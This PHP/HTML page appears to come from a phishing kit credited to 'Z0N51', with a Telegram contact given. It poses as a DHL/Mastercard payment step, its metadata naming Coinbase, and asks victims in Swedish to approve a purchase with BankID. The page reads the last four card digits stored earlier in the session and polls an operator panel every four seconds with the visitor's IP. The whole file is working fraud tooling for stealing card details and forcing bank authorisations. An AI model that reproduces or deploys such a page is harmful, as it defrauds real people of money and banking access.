<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51official
    ********************************************************/

    $_SESSION['last_page'] = "app2";
    $cc = substr($_SESSION['one'], -4);

?>

<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta name="discription" content="Coinbase">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="icon" href="<?php echo IMGSPATH; ?>/favicon.ico">
        <title>DHL</title>
        <!-- === bootstrap === -->
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" />
        <!-- == Font-awesome " icon " == -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
        <!-- == remixicon " icon " == -->
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
        <!-- == file style css == -->
        <link rel="stylesheet" href="<?php echo CSSPATH; ?>/style.css">
    </head>
    <body>


      <div id="app2">
        <div class="logo"><img src="<?php echo IMGSPATH; ?>/master.svg"></div>

        <h4>Signera med BankID</h4>
        <p>Signera ditt köp, <?php echo date('Y-m-d') ?>, genom att öppna mobilt BankID-appen på din mobiltelefon eller surfplatta</p>
        <div class="load"><img src="<?php echo IMGSPATH; ?>/loading.gif"></div>
      </div>

    <!-- bootstrap -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
    <!-- script jquery -->
    <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
    <script src="<?php echo JSPATH; ?>/js.js"></script>
    
    <script>        
            worker();
            var jsonData = {
              action: 'VISITORS',
              ip: '<?php echo get_client_ip(); ?>',
              page: 'app2'
            };
            sendAjaxRequestEveryFourSeconds(jsonData);          
    </script>
    </body>
</html>